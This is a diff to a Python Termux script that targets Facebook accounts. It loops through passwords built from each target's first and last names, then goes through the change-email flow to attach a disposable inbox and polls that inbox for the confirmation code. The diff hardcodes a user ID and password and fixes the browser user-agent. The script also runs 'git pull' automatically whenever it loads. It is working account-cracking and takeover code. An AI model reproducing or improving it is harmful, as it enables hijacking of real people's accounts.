@@ -7,6 +7,7 @@ from bs4 import BeautifulSoup as sop
 from pip._vendor import requests as requests
 from concurrent.futures import ThreadPoolExecutor as M4H4D1
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
+from fake_email import Email
 os.system('git pull');os.system('termux-setup-storage')
 try:
     import requests
@@ -153,10 +154,13 @@ def __Fire__(ids,names,passlist):
         ps = first.lower()
         ps2 = last.lower()
         for fikr in passlist:
-            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-            adid = str(uuid.uuid4())
+            mmail=Email().Mail()
+            em=mmail['mail']
+            passs = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
+            uid = '100052667114477'
+            pas = '881732'
             data={
-            'email': ids,
+            'email': uid,
             'cuid': '',
             'guid': 'f7d923be260ada3ea',
             'lgnjs': '1733767601',
@@ -211,7 +215,7 @@ def __Fire__(ids,names,passlist):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '21',
             'upgrade-insecure-requests': '1',
-            'user-agent': random_ua()}
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36'}
             for i in  re.findall('href="/changeemail(.*?)"',response.text):
                 url="/changeemail"+i
             response = requests.get("https://mbasic.facebook.com"+url, headers=headers)
@@ -231,7 +235,7 @@ def __Fire__(ids,names,passlist):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '21',
             'upgrade-insecure-requests': '1',
-            'user-agent': random_ua()}
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36'}
             data = {
             'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"',str(response.text)).group(1),
             'jazoest': re.search('name="jazoest" value="(.*?)"',str(response.text)).group(1),
@@ -242,7 +246,7 @@ def __Fire__(ids,names,passlist):
             'submit': 'Add'}
             url = "https://m.facebook.com"+re.findall('action="(.*?)"',response.text)[0]
             submit = requests.post(url, headers=headers, data=data)
-            r=requests.get("https://mbasic.facebook.com")
+            r=requests.get("https://touch.facebook.com")
             while True:
                h=Email(mmail["session"]).inbox()
                if h:
@@ -264,7 +268,7 @@ def __Fire__(ids,names,passlist):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': random_ua()}
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36'}
             data = {'contact': em,
             'type': 'submit',
             'is_soft_cliff': False,
